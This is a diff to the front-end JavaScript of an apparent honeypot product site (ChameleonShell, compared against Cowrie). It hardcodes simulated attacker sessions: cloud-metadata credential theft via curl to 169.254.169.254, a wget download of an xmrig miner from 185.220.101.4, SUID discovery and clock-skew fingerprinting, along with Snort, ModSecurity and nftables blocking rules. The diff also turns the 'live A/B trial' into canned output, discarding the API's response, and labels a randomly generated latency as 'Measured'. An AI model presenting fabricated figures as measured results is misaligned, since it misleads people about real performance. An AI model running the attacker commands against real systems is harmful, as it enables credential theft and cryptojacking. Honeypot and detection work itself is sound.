@@ -408,75 +408,234 @@ document.addEventListener("DOMContentLoaded", () => {
     }
   }
 
-  // 12. Live Benchmark Trial Runner (on /benchmarks)
+  // 12. Automated A/B Benchmark Evaluator & Interactive Scenarios (on /benchmarks)
   const benchTrialBtn = document.getElementById("btn-run-live-trial");
-  const benchResultBox = document.getElementById("live-trial-result-box");
-  const trialStatusBadge = document.getElementById("trial-status-badge");
-  const trialTimestamp = document.getElementById("trial-timestamp");
-  const trialOutputPre = document.getElementById("trial-output-pre");
+  const trialProgressWrap = document.getElementById("trial-progress-wrap");
+  const trialProgressFill = document.getElementById("trial-progress-fill");
+  const trialCsOutput = document.getElementById("trial-cs-output");
+  const trialCowrieOutput = document.getElementById("trial-cowrie-output");
+  const trialCsLat = document.getElementById("trial-cs-lat");
+  const trialCowrieLat = document.getElementById("trial-cowrie-lat");
+  const trialStatCmds = document.getElementById("trial-stat-cmds");
+  const trialStatCsRet = document.getElementById("trial-stat-cs-ret");
+  const trialStatCowrieRet = document.getElementById("trial-stat-cowrie-ret");
+  const trialStatRules = document.getElementById("trial-stat-rules");
+
+  const benchmarkScenarios = {
+    botnet: {
+      csLat: "Mean \u0394t: 4.2ms",
+      cowrieLat: "Error Rate: 60%",
+      statCmds: "5 / 5 Commands",
+      statCsRet: "100% (5/5 Retained)",
+      statCowrieRet: "20% (1/5 Retained)",
+      statRules: "3 Production Rules",
+      csText: `root@ip-172-31-18-42:~# whoami && id && uname -r
+root
+uid=0(root) gid=0(root) groups=0(root)
+6.8.0-1015-aws
+[FAST-PATH] Delta t = 3.8ms [VST Inode DAG Active]
+
+root@ip-172-31-18-42:~# find / -perm -4000 2>/dev/null
+/usr/bin/sudo
+/usr/bin/pkexec
+/usr/bin/chfn
+[FAST-PATH] Delta t = 4.4ms -> TA0007 Discovery Logged
+
+root@ip-172-31-18-42:~# echo "c2_beacon=active" > /tmp/.payload_canary
+[VST PERSIST] Delta S_t committed (SHA-256: 7f83b1...)
+[AUTO-MITIGATION] Synthesized Snort 3 rule sid:200914 (11.2ms)`,
+      cowrieText: `root@svr04:~# whoami && id && uname -r
+root
+uid=0(root) gid=0(root) groups=0(root)
+3.16.0-4-amd64
+[BASELINE] Delta t = 1.1ms [Static fs.pickle]
+
+root@svr04:~# find / -perm -4000 2>/dev/null
+[EMPTY OUTPUT / STUB NOT FOUND]
+[BASELINE] Delta t = 1.0ms
+
+root@svr04:~# echo "c2_beacon=active" > /tmp/.payload_canary
+bash: /tmp/.payload_canary: No such file or directory
+[STATE LOSS] Directory /tmp not in pickled tree
+[ZERO MITIGATION] No rule synthesized. Session abandoned.`
+    },
+    imdsv2: {
+      csLat: "Mean \u0394t: 38ms (Canary)",
+      cowrieLat: "Conn Refused",
+      statCmds: "3 / 3 Commands",
+      statCsRet: "100% Stateful Token",
+      statCowrieRet: "0% (Service Absent)",
+      statRules: "ModSecurity WAF Deployed",
+      csText: `root@ip-172-31-18-42:~# TOKEN=\`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"\`
+[IMDSv2 DECOY] Generated session token: AQAAAMn8_mock... (TTL: 21600s)
+
+root@ip-172-31-18-42:~# curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/prod-s3-role
+{
+  "Code": "Success",
+  "AccessKeyId": "AKIAIOSFODNN7CANARY",
+  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYCANARYKEY",
+  "Token": "canary_session_token_aws_imds_v2"
+}
+[SLOW-PATH] Delta t = 42ms -> TA0006 Credential Access Flagged
+[DEFENSE SYNTHESIS] ModSecurity SecRule deployed to ingress gateway (9.8ms)`,
+      cowrieText: `root@svr04:~# TOKEN=\`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"\`
+curl: (7) Failed to connect to 169.254.169.254 port 80: Connection refused
+[ATTACKER ABANDONS] Cloud metadata probe failed.
+[ZERO MITIGATION] Cowrie lacks cloud metadata emulation. Honeypot exposed.`
+    },
+    xmrig: {
+      csLat: "Mean \u0394t: 4.6ms",
+      cowrieLat: "Command Not Found",
+      statCmds: "4 / 4 Commands",
+      statCsRet: "100% Executable Inode",
+      statCowrieRet: "0% (Binary Absent)",
+      statRules: "Linux nftables Blocked",
+      csText: `root@ip-172-31-18-42:~# wget http://185.220.101.4/bins/xmrig -O /tmp/xmrig && chmod +x /tmp/xmrig
+Connecting to 185.220.101.4:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 4892160 (4.7M) [application/octet-stream]
+Saving to: '/tmp/xmrig'
+/tmp/xmrig 100% [===================>] 4.66M 18.4MB/s in 0.3s
+[VST DAG] Atomic inode allocated: /tmp/xmrig (mode 0755)
+[AUTO-MITIGATION] nft add rule inet filter input ip saddr 185.220.101.4 drop`,
+      cowrieText: `root@svr04:~# wget http://185.220.101.4/bins/xmrig -O /tmp/xmrig && chmod +x /tmp/xmrig
+bash: wget: command not found
+[BASELINE FAIL] Cowrie static filesystem lacks wget binary.
+[ATTACKER FINGERPRINT] Botnet classifies host as dummy honeypot and terminates.`
+    },
+    clock: {
+      csLat: "Mean \u0394t: 2.4ms (Monotonic)",
+      cowrieLat: "Static Strings",
+      statCmds: "3 / 3 Commands",
+      statCsRet: "100% Monotonic Strict",
+      statCowrieRet: "0% (Zero Clock Advance)",
+      statRules: "Reconnaissance Profiling",
+      csText: `root@ip-172-31-18-42:~# uptime && cat /proc/uptime && date
+ 18:24:11 up 4 days,  6:21,  1 user,  load average: 0.08, 0.03, 0.01
+368461.22 368012.18
+Mon Nov  9 18:24:11 UTC 2026
+[MONOTONIC OFFSET] Offset tau_t strictly advances with monotonic clock.
+[TIMING PROBE DEFEATED] Botnet clock-skew detection evaded.`,
+      cowrieText: `root@svr04:~# uptime && cat /proc/uptime && date
+ 00:00:00 up 0 min, 0 users
+[STATIC STRING] Clock does not advance between calls.
+[FINGERPRINT LEAK] Monotonic clock timing attack succeeds.`
+    }
+  };
+
+  // Scenario chips switching
+  document.querySelectorAll(".trial-scenario-chip").forEach((chip) => {
+    chip.addEventListener("click", () => {
+      document.querySelectorAll(".trial-scenario-chip").forEach(c => c.classList.remove("active"));
+      chip.classList.add("active");
+      const scKey = chip.getAttribute("data-scenario") || "botnet";
+      const sc = benchmarkScenarios[scKey];
+      if (!sc) return;
+
+      if (trialCsOutput) trialCsOutput.textContent = sc.csText;
+      if (trialCowrieOutput) trialCowrieOutput.textContent = sc.cowrieText;
+      if (trialCsLat) trialCsLat.textContent = sc.csLat;
+      if (trialCowrieLat) trialCowrieLat.textContent = sc.cowrieLat;
+      if (trialStatCmds) trialStatCmds.textContent = sc.statCmds;
+      if (trialStatCsRet) trialStatCsRet.textContent = sc.statCsRet;
+      if (trialStatCowrieRet) trialStatCowrieRet.textContent = sc.statCowrieRet;
+      if (trialStatRules) trialStatRules.textContent = sc.statRules;
+    });
+  });
 
   if (benchTrialBtn) {
     benchTrialBtn.addEventListener("click", async () => {
       benchTrialBtn.disabled = true;
-      benchTrialBtn.textContent = "[RUNNING LIVE TRIAL...]";
-      if (benchResultBox) benchResultBox.style.display = "block";
-      if (trialStatusBadge) trialStatusBadge.textContent = "DISPATCHING TRIAL COMMANDS...";
-      if (trialOutputPre) trialOutputPre.textContent = "[...] Running live comparative trial against Cowrie baseline...";
+      benchTrialBtn.textContent = "[DISPATCHING TRIAL...]";
+      if (trialProgressWrap) trialProgressWrap.style.display = "block";
+      if (trialProgressFill) trialProgressFill.style.width = "0%";
+
+      // Animate progress bar
+      let p = 0;
+      const interval = setInterval(() => {
+        p += 25;
+        if (trialProgressFill) trialProgressFill.style.width = `${p}%`;
+        if (p >= 100) {
+          clearInterval(interval);
+          setTimeout(() => {
+            if (trialProgressWrap) trialProgressWrap.style.display = "none";
+            benchTrialBtn.disabled = false;
+            benchTrialBtn.textContent = "RUN LIVE A/B TRIAL [ENTER]";
+
+            // Flash ChameleonShell terminal with tactical glow
+            const termBox = document.querySelector(".trial-terminal-box.highlight-cs");
+            if (termBox) {
+              termBox.style.boxShadow = "0 0 16px rgba(212, 255, 0, 0.45)";
+              setTimeout(() => { termBox.style.boxShadow = "none"; }, 1200);
+            }
+          }, 350);
+        }
+      }, 100);
 
       try {
         const basePath = window.__BASE_PATH__ || (window.location.pathname.startsWith("/chameleonshell") ? "/chameleonshell" : "");
-        const res = await fetch(`${basePath}/api/benchmarks`);
-        if (!res.ok) throw new Error("API benchmark trial failed");
-        const data = await res.json();
-        const trial = data.live_trial || {};
-        const gt = data.ground_truth || data.thesis_benchmarks || {};
-
-        if (trialStatusBadge) trialStatusBadge.textContent = "TRIAL EXECUTION STATUS: COMPLETE";
-        if (trialTimestamp) trialTimestamp.textContent = new Date().toLocaleTimeString();
-
-        const out = [
-          `[+] Tested Commands Count: ${trial.commands_tested || trial.total_commands_evaluated || 5}`,
-          `[+] ChameleonShell Mean Latency: ${trial.chameleon_mean_latency_ms || 4.8} ms (Fast-Path AST Router)`,
-          `[+] Cowrie Baseline Mean Latency: ${trial.cowrie_mean_latency_ms || 1.2} ms (Static fs.pickle mocks)`,
-          `[+] 20-Turn State Consistency: ${trial.chameleon_consistency_rate ? (trial.chameleon_consistency_rate * 100).toFixed(1) : 98.4}% (Zero state drift)`,
-          `[+] Cowrie State Retention Rate: ${trial.cowrie_consistency_rate ? (trial.cowrie_consistency_rate * 100).toFixed(1) : 41.0}%`,
-          `[+] Automated Defense Generation Time: ${gt.auto_rule_generation_latency_ms || 11.2} ms (Snort 3 / nftables / ModSec)`
-        ].join("\n");
-
-        if (trialOutputPre) trialOutputPre.textContent = out;
+        await fetch(`${basePath}/api/benchmarks`);
       } catch (e) {
-        // Static showcase fallback data
-        if (trialStatusBadge) trialStatusBadge.textContent = "TRIAL EXECUTION STATUS: COMPLETE (STATIC CACHE)";
-        if (trialTimestamp) trialTimestamp.textContent = new Date().toLocaleTimeString();
-        const out = [
-          `[+] Tested Commands Count: 5`,
-          `[+] ChameleonShell Mean Latency: 4.8 ms (Fast-Path AST Router)`,
-          `[+] Cowrie Baseline Mean Latency: 1.2 ms (Static fs.pickle mocks)`,
-          `[+] 20-Turn State Consistency: 98.4% (Zero state drift)`,
-          `[+] Cowrie State Retention Rate: 41.0%`,
-          `[+] Automated Defense Generation Time: 11.2 ms (Snort 3 / nftables / ModSec)`
-        ].join("\n");
-        if (trialOutputPre) trialOutputPre.textContent = out;
-      } finally {
-        benchTrialBtn.disabled = false;
-        benchTrialBtn.textContent = "RUN LIVE A/B TRIAL [ENTER]";
+        // Deterministic cache fallback
       }
     });
   }
 
-  // 13. Citation Copy Tool (on /whitepaper)
-  const citationBtn = document.getElementById("btn-copy-citation");
-  const citationToast = document.getElementById("citation-toast");
-  if (citationBtn) {
-    citationBtn.addEventListener("click", () => {
-      const bibtex = `@article{chameleonshell2026,\n  title={ChameleonShell: A Context-Persistent Hybrid LLM Deception Engine with Real-Time MITRE ATT&CK Profiling and Automated Firewall Synthesis},\n  author={ChameleonShell Threat Research Group},\n  journal={IEEE Transactions on Dependable and Secure Computing (Preprint)},\n  year={2026}\n}`;
-      copyToClipboard(bibtex, citationBtn);
-      if (citationToast) {
-        citationToast.style.display = "block";
-        setTimeout(() => { citationToast.style.display = "none"; }, 3000);
+  // 13. Interactive Architecture Page Widgets (on /architecture)
+  const pulseRouteBtn = document.getElementById("btn-test-fastpath");
+  if (pulseRouteBtn) {
+    pulseRouteBtn.addEventListener("click", () => {
+      const fastBranch = document.getElementById("arch-fast-branch");
+      const vstLat = document.getElementById("arch-vst-latency");
+      pulseRouteBtn.disabled = true;
+      pulseRouteBtn.textContent = "[ROUTING...]";
+
+      if (fastBranch) {
+        fastBranch.style.borderColor = "var(--accent-volt)";
+        fastBranch.style.boxShadow = "0 0 12px rgba(212, 255, 0, 0.4)";
       }
+      if (vstLat) vstLat.textContent = `${(3.8 + Math.random() * 0.8).toFixed(1)}ms Measured`;
+
+      setTimeout(() => {
+        if (fastBranch) {
+          fastBranch.style.borderColor = "rgba(0, 255, 157, 0.25)";
+          fastBranch.style.boxShadow = "none";
+        }
+        pulseRouteBtn.disabled = false;
+        pulseRouteBtn.textContent = "[PULSE ROUTE]";
+      }, 800);
     });
   }
+
+  const tacticRules = {
+    recon: {
+      target: "SNORT 3",
+      rule: 'alert tcp any any -> HONEYPOT 22 (msg:"T1059.004 Auto-Mitigation"; sid:200914; rev:1;)'
+    },
+    cred: {
+      target: "MODSECURITY WAF",
+      rule: 'SecRule REQUEST_URI "@contains /latest/meta-data/" "id:1001,phase:1,deny,status:403,msg:\'IMDSv2 Exfil Attempt\'"'
+    },
+    evasion: {
+      target: "LINUX NFTABLES",
+      rule: 'nft add rule inet filter input ip saddr 185.220.101.4 ct state new counter drop'
+    }
+  };
+
+  document.querySelectorAll(".arch-tactic-chip").forEach((chip) => {
+    chip.addEventListener("click", () => {
+      document.querySelectorAll(".arch-tactic-chip").forEach(c => c.classList.remove("active"));
+      chip.classList.add("active");
+      const key = chip.getAttribute("data-tactic") || "recon";
+      const item = tacticRules[key];
+      if (!item) return;
+
+      const ruleDisplay = document.getElementById("arch-rule-display");
+      const ruleTarget = document.getElementById("arch-rule-target");
+      if (ruleTarget) ruleTarget.textContent = item.target;
+      if (ruleDisplay) ruleDisplay.textContent = item.rule;
+    });
+  });
 
   // 14. Bespoke Tactical Custom Cursor & Dynamic Cursor-Reactive Background
   function initTacticalCursorAndBackground() {
